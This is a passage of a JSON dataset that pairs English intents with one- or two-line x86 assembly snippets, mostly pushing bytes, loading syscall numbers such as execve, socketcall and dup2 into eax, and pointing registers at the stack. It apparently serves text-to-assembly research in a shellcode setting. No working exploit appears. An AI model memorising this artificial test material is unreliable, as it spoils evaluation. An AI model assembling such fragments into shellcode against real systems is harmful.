    "slot_map": {
      "0x06": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x0b onto the stack",
    "rewritten_intent": "push the byte 0x0b onto the stack",
    "snippet": "push byte 0x0b",
    "slot_map": {
      "0x0b": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x0b into the eax register",
    "rewritten_intent": "put the syscall 0x0b into the eax register",
    "snippet": "push byte 0x0b \\n pop eax",
    "slot_map": {
      "0x0b": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x1 to the stack",
    "rewritten_intent": "push the byte 0x1 to the stack",
    "snippet": "push byte 0x1",
    "slot_map": {
      "0x1": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "push the byte 0x1 onto the stack",
    "rewritten_intent": "push the byte 0x1 onto the stack",
    "snippet": "push byte 0x1",
    "slot_map": {
      "0x1": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "push the byte 0x1 onto the stack and point ecx to the stack register",
    "rewritten_intent": "push the byte 0x1 onto the stack and point ecx to the stack register",
    "snippet": "push byte 0x1 \\n mov ecx, esp",
    "slot_map": {
      "0x1": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the byte 0x10 onto the stack",
    "rewritten_intent": "push the byte 0x10 onto the stack",
    "snippet": "push byte 0x10",
    "slot_map": {
      "0x10": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x10 into the eax register",
    "rewritten_intent": "put the syscall 0x10 into the eax register",
    "snippet": "push byte 0x10 \\n pop eax",
    "slot_map": {
      "0x10": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x11 onto the stack and point ebx to the stack register",
    "rewritten_intent": "push the byte 0x11 onto the stack and point ebx to the stack register",
    "snippet": "push byte 0x11 \\n mov ebx, esp",
    "slot_map": {
      "0x11": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the byte 0x17 onto the stack",
    "rewritten_intent": "push the byte 0x17 onto the stack",
    "snippet": "push byte 0x17",
    "slot_map": {
      "0x17": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x17 into the eax register",
    "rewritten_intent": "put the syscall 0x17 into the eax register",
    "snippet": "push byte 0x17 \\n pop eax",
    "slot_map": {
      "0x17": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x1c onto the stack",
    "rewritten_intent": "push the byte 0x1c onto the stack",
    "snippet": "push byte 0x1c",
    "slot_map": {
      "0x1c": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x1c into the eax register",
    "rewritten_intent": "put the syscall 0x1c into the eax register",
    "snippet": "push byte 0x1c \\n pop eax",
    "slot_map": {
      "0x1c": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x1f onto the stack",
    "rewritten_intent": "push the byte 0x1f onto the stack",
    "snippet": "push byte 0x1f",
    "slot_map": {
      "0x1f": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x1f into the eax register",
    "rewritten_intent": "put the syscall 0x1f into the eax register",
    "snippet": "push byte 0x1f \\n pop eax",
    "slot_map": {
      "0x1f": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x2 onto the stack",
    "rewritten_intent": "push the byte 0x2 onto the stack",
    "snippet": "push byte 0x2",
    "slot_map": {
      "0x2": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "push the byte 0x2 to the stack",
    "rewritten_intent": "push the byte 0x2 to the stack",
    "snippet": "push byte 0x2",
    "slot_map": {
      "0x2": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "push the byte 0x2 onto the stack and point ecx to the stack register",
    "rewritten_intent": "push the byte 0x2 onto the stack and point ecx to the stack register",
    "snippet": "push byte 0x2 \\n mov ecx, esp",
    "slot_map": {
      "0x2": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "put the syscall 0x2 into the eax register",
    "rewritten_intent": "put the syscall 0x2 into the eax register",
    "snippet": "push byte 0x2 \\n pop eax",
    "slot_map": {
      "0x2": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x2e onto the stack",
    "rewritten_intent": "push the byte 0x2e onto the stack",
    "snippet": "push byte 0x2e",
    "slot_map": {
      "0x2e": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x2e into the eax register",
    "rewritten_intent": "put the syscall 0x2e into the eax register",
    "snippet": "push byte 0x2e \\n pop eax",
    "slot_map": {
      "0x2e": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x2f onto the stack",
    "rewritten_intent": "push the byte 0x2f onto the stack",
    "snippet": "push byte 0x2f",
    "slot_map": {
      "0x2f": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x2f into the eax register",
    "rewritten_intent": "put the syscall 0x2f into the eax register",
    "snippet": "push byte 0x2f \\n pop eax",
    "slot_map": {
      "0x2f": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x3 onto the stack",
    "rewritten_intent": "push the byte 0x3 onto the stack",
    "snippet": "push byte 0x3",
    "slot_map": {
      "0x3": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x3 into the eax register",
    "rewritten_intent": "put the syscall 0x3 into the eax register",
    "snippet": "push byte 0x3 \\n pop eax",
    "slot_map": {
      "0x3": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x30 onto the stack",
    "rewritten_intent": "push the byte 0x30 onto the stack",
    "snippet": "push byte 0x30",
    "slot_map": {
      "0x30": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x30 into the eax register",
    "rewritten_intent": "put the syscall 0x30 into the eax register",
    "snippet": "push byte 0x30 \\n pop eax",
    "slot_map": {
      "0x30": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x3f onto the stack",
    "rewritten_intent": "push the byte 0x3f onto the stack",
    "snippet": "push byte 0x3f",
    "slot_map": {
      "0x3f": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x3f into the eax register",
    "rewritten_intent": "put the syscall 0x3f into the eax register",
    "snippet": "push byte 0x3f \\n pop eax",
    "slot_map": {
      "0x3f": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x4 onto the stack",
    "rewritten_intent": "push the byte 0x4 onto the stack",
    "snippet": "push byte 0x4",
    "slot_map": {
      "0x4": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x4 into the eax register",
    "rewritten_intent": "put the syscall 0x4 into the eax register",
    "snippet": "push byte 0x4 \\n pop eax",
    "slot_map": {
      "0x4": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "make the system call sigaction",
    "rewritten_intent": "make the system call sigaction",
    "snippet": "push byte 0x43",
    "slot_map": {
      "sigaction": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "0x43"
    ]
  },
  {
    "intent": "sigaction",
    "rewritten_intent": "sigaction",
    "snippet": "push byte 0x43",
    "slot_map": {
      "sigaction": "var0"
    },
    "intent_tokens": [
      "var0"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "0x43"
    ]
  },
  {
    "intent": "syscall for sigaction",
    "rewritten_intent": "syscall for sigaction",
    "snippet": "push byte 0x43",
    "slot_map": {
      "for": "var0",
      "sigaction": "var1"
    },
    "intent_tokens": [
      "syscall",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "0x43"
    ]
  },
  {
    "intent": "system call sigaction",
    "rewritten_intent": "system call sigaction",
    "snippet": "push byte 0x43",
    "slot_map": {
      "sigaction": "var0"
    },
    "intent_tokens": [
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "0x43"
    ]
  },
  {
    "intent": "put syscall sigaction into the eax register",
    "rewritten_intent": "put syscall sigaction into the eax register",
    "snippet": "push byte 0x43 \\n pop eax",
    "slot_map": {
      "sigaction": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "0x43",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "put the syscall 0x43 into the eax register",
    "rewritten_intent": "put the syscall 0x43 into the eax register",
    "snippet": "push byte 0x43 \\n pop eax",
    "slot_map": {
      "0x43": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x5 onto the stack and point ebx to the stack register",
    "rewritten_intent": "push the byte 0x5 onto the stack and point ebx to the stack register",
    "snippet": "push byte 0x5 \\n mov ebx, esp",
    "slot_map": {
      "0x5": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the byte 0x5 onto the stack and point edx to the stack register",
    "rewritten_intent": "push the byte 0x5 onto the stack and point edx to the stack register",
    "snippet": "push byte 0x5 \\n mov edx, esp",
    "slot_map": {
      "0x5": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the byte 0x64 to the stack",
    "rewritten_intent": "push the byte 0x64 to the stack",
    "snippet": "push byte 0x64",
    "slot_map": {
      "0x64": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "push the byte 0x64 onto the stack",
    "rewritten_intent": "push the byte 0x64 onto the stack",
    "snippet": "push byte 0x64",
    "slot_map": {
      "0x64": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x64 into the eax register",
    "rewritten_intent": "put the syscall 0x64 into the eax register",
    "snippet": "push byte 0x64 \\n pop eax",
    "slot_map": {
      "0x64": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x66 onto the stack",
    "rewritten_intent": "push the byte 0x66 onto the stack",
    "snippet": "push byte 0x66",
    "slot_map": {
      "0x66": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x66 into the eax register",
    "rewritten_intent": "put the syscall 0x66 into the eax register",
    "snippet": "push byte 0x66 \\n pop eax",
    "slot_map": {
      "0x66": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x7 onto the stack and point edx to the stack register",
    "rewritten_intent": "push the byte 0x7 onto the stack and point edx to the stack register",
    "snippet": "push byte 0x7 \\n mov edx, esp",
    "slot_map": {
      "0x7": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the byte 0x77 to the stack",
    "rewritten_intent": "push the byte 0x77 to the stack",
    "snippet": "push byte 0x77",
    "slot_map": {
      "0x77": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "push the byte 0x77 onto the stack",
    "rewritten_intent": "push the byte 0x77 onto the stack",
    "snippet": "push byte 0x77",
    "slot_map": {
      "0x77": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x77 into the eax register",
    "rewritten_intent": "put the syscall 0x77 into the eax register",
    "snippet": "push byte 0x77 \\n pop eax",
    "slot_map": {
      "0x77": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x8 onto the stack and point edx to the stack register",
    "rewritten_intent": "push the byte 0x8 onto the stack and point edx to the stack register",
    "snippet": "push byte 0x8 \\n mov edx, esp",
    "slot_map": {
      "0x8": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the byte 0xb onto the stack",
    "rewritten_intent": "push the byte 0xb onto the stack",
    "snippet": "push byte 0xb",
    "slot_map": {
      "0xb": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0xb into the eax register",
    "rewritten_intent": "put the syscall 0xb into the eax register",
    "snippet": "push byte 0xb \\n pop eax",
    "slot_map": {
      "0xb": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0xc onto the stack",
    "rewritten_intent": "push the byte 0xc onto the stack",
    "snippet": "push byte 0xc",
    "slot_map": {
      "0xc": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0xc into the eax register",
    "rewritten_intent": "put the syscall 0xc into the eax register",
    "snippet": "push byte 0xc \\n pop eax",
    "slot_map": {
      "0xc": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "move byte 1 onto stack",
    "rewritten_intent": "move byte 1 onto stack",
    "snippet": "push byte 1",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "byte",
      "1",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "1"
    ]
  },
  {
    "intent": "push byte 1 onto the stack",
    "rewritten_intent": "push byte 1 onto the stack",
    "snippet": "push byte 1",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "1",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "1"
    ]
  },
  {
    "intent": "push the byte 1 to the stack",
    "rewritten_intent": "push the byte 1 to the stack",
    "snippet": "push byte 1",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "1",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "1"
    ]
  },
  {
    "intent": "push the byte 1 onto the stack",
    "rewritten_intent": "push the byte 1 onto the stack",
    "snippet": "push byte 1",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "1",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "1"
    ]
  },
  {
    "intent": "push the byte 1 onto the stack and point eax to the stack register",
    "rewritten_intent": "push the byte 1 onto the stack and point eax to the stack register",
    "snippet": "push byte 1 \\n mov eax, esp",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "1",
      "stack",
      "and",
      "point",
      "var0",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "1",
      "\\n",
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "put the syscall 1 into the eax register",
    "rewritten_intent": "put the syscall 1 into the eax register",
    "snippet": "push byte 1 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "1",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "1",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 10 onto the stack",
    "rewritten_intent": "push the byte 10 onto the stack",
    "snippet": "push byte 10",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "10",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "10"
    ]
  },
  {
    "intent": "push the byte 10 to the stack",
    "rewritten_intent": "push the byte 10 to the stack",
    "snippet": "push byte 10",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "10",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "10"
    ]
  },
  {
    "intent": "put the syscall 10 into the eax register",
    "rewritten_intent": "put the syscall 10 into the eax register",
    "snippet": "push byte 10 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "10",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "10",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 11 onto the stack",
    "rewritten_intent": "push the byte 11 onto the stack",
    "snippet": "push byte 11",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "11",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "11"
    ]
  },
  {
    "intent": "push the byte 11 to the stack",
    "rewritten_intent": "push the byte 11 to the stack",
    "snippet": "push byte 11",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "11",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "11"
    ]
  },
  {
    "intent": "put the syscall 11 into the eax register",
    "rewritten_intent": "put the syscall 11 into the eax register",
    "snippet": "push byte 11 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "11",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "11",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 15 onto the stack",
    "rewritten_intent": "push the byte 15 onto the stack",
    "snippet": "push byte 15",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "15",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "15"
    ]
  },
  {
    "intent": "push the byte 15 to the stack",
    "rewritten_intent": "push the byte 15 to the stack",
    "snippet": "push byte 15",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "15",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "15"
    ]
  },
  {
    "intent": "put the syscall 15 into the eax register",
    "rewritten_intent": "put the syscall 15 into the eax register",
    "snippet": "push byte 15 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "15",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "15",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push byte 16 onto stack",
    "rewritten_intent": "push byte 16 onto stack",
    "snippet": "push byte 16",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "16",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "16"
    ]
  },
  {
    "intent": "push the byte 16 onto the stack",
    "rewritten_intent": "push the byte 16 onto the stack",
    "snippet": "push byte 16",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "16",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "16"
    ]
  },
  {
    "intent": "put the syscall 16 into the eax register",
    "rewritten_intent": "put the syscall 16 into the eax register",
    "snippet": "push byte 16 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "16",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "16",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 17h onto the stack",
    "rewritten_intent": "push the byte 17h onto the stack",
    "snippet": "push byte 17h",
    "slot_map": {
      "17h": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 17h into the eax register",
    "rewritten_intent": "put the syscall 17h into the eax register",
    "snippet": "push byte 17h \\n pop eax",
    "slot_map": {
      "17h": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push byte 2 onto the stack",
    "rewritten_intent": "push byte 2 onto the stack",
    "snippet": "push byte 2",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "2",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "2"
    ]
  },
  {
    "intent": "push the byte 2 onto the stack",
    "rewritten_intent": "push the byte 2 onto the stack",
    "snippet": "push byte 2",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "2",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "2"
    ]
  },
  {
    "intent": "put the syscall 2 into the eax register",
    "rewritten_intent": "put the syscall 2 into the eax register",
    "snippet": "push byte 2 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "2",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "2",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 25 onto the stack",
    "rewritten_intent": "push the byte 25 onto the stack",
    "snippet": "push byte 25",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "25",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "25"
    ]
  },
  {
    "intent": "put the syscall 25 into the eax register",
    "rewritten_intent": "put the syscall 25 into the eax register",
    "snippet": "push byte 25 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "25",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "25",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 28 to the stack",
    "rewritten_intent": "push the byte 28 to the stack",
    "snippet": "push byte 28",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "28",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "28"
    ]
  },
  {
    "intent": "put the syscall 28 into the eax register",
    "rewritten_intent": "put the syscall 28 into the eax register",
    "snippet": "push byte 28 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "28",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "28",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 3 onto the stack and point ebx to the stack register",
    "rewritten_intent": "push the byte 3 onto the stack and point ebx to the stack register",
    "snippet": "push byte 3 \\n mov ebx, esp",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "3",
      "stack",
      "and",
      "point",
      "var0",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "3",
      "\\n",
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the byte 37 onto the stack",
    "rewritten_intent": "push the byte 37 onto the stack",
    "snippet": "push byte 37",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "37",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "37"
    ]
  },
  {
